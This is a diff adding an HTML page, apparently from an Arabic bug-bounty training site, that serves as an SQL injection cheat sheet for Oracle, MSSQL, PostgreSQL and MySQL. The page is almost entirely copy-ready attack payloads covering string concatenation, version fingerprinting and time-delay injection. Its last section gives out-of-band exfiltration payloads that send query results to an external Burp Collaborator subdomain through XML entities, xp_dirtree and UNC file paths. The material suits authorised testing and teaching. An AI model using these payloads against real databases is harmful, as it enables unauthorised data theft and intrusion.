@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <title>SQL Injection Master Cheat Sheet - Bug Bounty Academy</title>
+  <link rel="stylesheet" href="../assets/css/style.css?v=1.0">
+  <link href="https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&family=Fira+Code:wght@400;600&display=swap" rel="stylesheet">
+  <style>
+    body { background-color: #0d1117; color: #c9d1d9; font-family: 'Cairo', sans-serif; margin: 0; padding: 0; line-height: 1.8; }
+    .doc-container { max-width: 1150px; margin: 0 auto; padding: 30px 20px; }
+    .doc-header { border-bottom: 2px solid #30363d; padding-bottom: 20px; margin-bottom: 30px; }
+    .doc-title { font-size: 2.2rem; color: #f97316; font-weight: 800; display: flex; align-items: center; gap: 12px; }
+    .doc-subtitle { color: #8b949e; font-size: 1.1rem; }
+    .section-card { background: #161b22; border: 1px solid #30363d; border-radius: 10px; padding: 25px; margin-bottom: 30px; box-shadow: 0 4px 20px rgba(0,0,0,0.2); }
+    .section-title { font-size: 1.4rem; color: #58a6ff; border-right: 4px solid #f97316; padding-right: 12px; margin-top: 0; margin-bottom: 20px; }
+    .cs-table { width: 100%; border-collapse: collapse; margin-top: 15px; font-size: 0.88rem; direction: ltr; text-align: left; }
+    .cs-table th { background: #21262d; color: #f97316; padding: 10px; border-bottom: 1px solid #30363d; }
+    .cs-table td { padding: 10px; border-bottom: 1px solid #21262d; font-family: 'Fira Code', monospace; color: #38bdf8; }
+    .cs-table tr:hover { background: #0d1117; }
+    .db-badge { font-weight: bold; padding: 2px 6px; border-radius: 4px; font-size: 0.75rem; display: inline-block; width: 85px; text-align: center; }
+    .db-oracle { background: rgba(239, 68, 68, 0.2); color: #f87171; border: 1px solid #ef4444; }
+    .db-mssql { background: rgba(59, 130, 246, 0.2); color: #60a5fa; border: 1px solid #3b82f6; }
+    .db-postgres { background: rgba(168, 85, 247, 0.2); color: #c084fc; border: 1px solid #a855f7; }
+    .db-mysql { background: rgba(245, 158, 11, 0.2); color: #fbbf24; border: 1px solid #f59e0b; }
+    .btn-copy { background: #21262d; border: 1px solid #30363d; color: #fff; padding: 4px 8px; border-radius: 4px; cursor: pointer; font-size: 0.75rem; float: right; }
+    .btn-copy:hover { background: #f97316; color: #000; }
+  </style>
+</head>
+<body>
+  <div class="doc-container">
+    <header class="doc-header">
+      <a href="../index.html" style="color:#58a6ff; text-decoration:none; font-weight:bold;"><i class="bx bx-right-arrow-alt"></i> العودة للرئيسية</a>
+      <h1 class="doc-title"><i class="bx bx-data"></i> SQL Injection Master Cheat Sheet</h1>
+      <p class="doc-subtitle">الدليل المرجعي الفائق وشفرات التخريش لجميع قواعد البيانات (Oracle, MSSQL, PostgreSQL, MySQL).</p>
+    </header>
+
+    <!-- SECTION 1: STRING CONCATENATION & SUBSTRING -->
+    <div class="section-card">
+      <h2 class="section-title">1. دمج النصوص واستخراج الأجزاء (String Concatenation & Substring)</h2>
+      <table class="cs-table">
+        <thead><tr><th>DB Type</th><th>Task / Syntax Payload</th></tr></thead>
+        <tbody>
+          <tr><td><span class="db-badge db-oracle">Oracle</span></td><td>'foo'||'bar' <button class="btn-copy" onclick="navigator.clipboard.writeText('\'foo\'||\'bar\'')">Copy</button></td></tr>
+          <tr><td><span class="db-badge db-mssql">MSSQL</span></td><td>'foo'+'bar' <button class="btn-copy" onclick="navigator.clipboard.writeText('\'foo\'+\'bar\'')">Copy</button></td></tr>
+          <tr><td><span class="db-badge db-postgres">PostgreSQL</span></td><td>'foo'||'bar' <button class="btn-copy" onclick="navigator.clipboard.writeText('\'foo\'||\'bar\'')">Copy</button></td></tr>
+          <tr><td><span class="db-badge db-mysql">MySQL</span></td><td>CONCAT('foo','bar') OR 'foo' 'bar' <button class="btn-copy" onclick="navigator.clipboard.writeText('CONCAT(\'foo\',\'bar\')')">Copy</button></td></tr>
+        </tbody>
+      </table>
+
+      <h3 style="color:#58a6ff; margin-top:25px;">✂️ استخراج جزء من النص (Substring Extraction):</h3>
+      <table class="cs-table">
+        <tbody>
+          <tr><td><span class="db-badge db-oracle">Oracle</span></td><td>SUBSTR('foobar', 4, 2)</td></tr>
+          <tr><td><span class="db-badge db-mssql">MSSQL</span></td><td>SUBSTRING('foobar', 4, 2)</td></tr>
+          <tr><td><span class="db-badge db-postgres">PostgreSQL</span></td><td>SUBSTRING('foobar', 4, 2)</td></tr>
+          <tr><td><span class="db-badge db-mysql">MySQL</span></td><td>SUBSTRING('foobar', 4, 2)</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <!-- SECTION 2: VERSION & CONTENTS ENUMERATION -->
+    <div class="section-card">
+      <h2 class="section-title">2. فحص نوع وقواعد بيانات السيرفر (Database Version & Contents)</h2>
+      <table class="cs-table">
+        <thead><tr><th>DB Type</th><th>Version Fingerprint Payload</th></tr></thead>
+        <tbody>
+          <tr><td><span class="db-badge db-oracle">Oracle</span></td><td>SELECT banner FROM v$version</td></tr>
+          <tr><td><span class="db-badge db-mssql">MSSQL</span></td><td>SELECT @@version</td></tr>
+          <tr><td><span class="db-badge db-postgres">PostgreSQL</span></td><td>SELECT version()</td></tr>
+          <tr><td><span class="db-badge db-mysql">MySQL</span></td><td>SELECT @@version</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <!-- SECTION 3: TIME DELAYS & COLLABORATOR DNS EXFILTRATION -->
+    <div class="section-card">
+      <h2 class="section-title">3. تأخير الوقت واتصالات الـ DNS الخارجية (Time Delays & Burp Collaborator DNS)</h2>
+      <table class="cs-table">
+        <thead><tr><th>DB Type</th><th>Time Delay Payload (10 Sec)</th></tr></thead>
+        <tbody>
+          <tr><td><span class="db-badge db-oracle">Oracle</span></td><td>dbms_pipe.receive_message(('a'),10)</td></tr>
+          <tr><td><span class="db-badge db-mssql">MSSQL</span></td><td>WAITFOR DELAY '0:0:10'</td></tr>
+          <tr><td><span class="db-badge db-postgres">PostgreSQL</span></td><td>SELECT pg_sleep(10)</td></tr>
+          <tr><td><span class="db-badge db-mysql">MySQL</span></td><td>SELECT SLEEP(10)</td></tr>
+        </tbody>
+      </table>
+
+      <h3 style="color:#58a6ff; margin-top:25px;">🛰️ تسريب البيانات عبر Burp Collaborator DNS Lookups:</h3>
+      <table class="cs-table">
+        <tbody>
+          <tr><td><span class="db-badge db-oracle">Oracle</span></td><td>SELECT EXTRACTVALUE(xmltype('&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"&gt; %remote;]&gt;'),'/l') FROM dual</td></tr>
+          <tr><td><span class="db-badge db-mssql">MSSQL</span></td><td>declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')</td></tr>
+          <tr><td><span class="db-badge db-mysql">MySQL</span></td><td>SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\\a'</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+  </div>
+</body>
+</html>
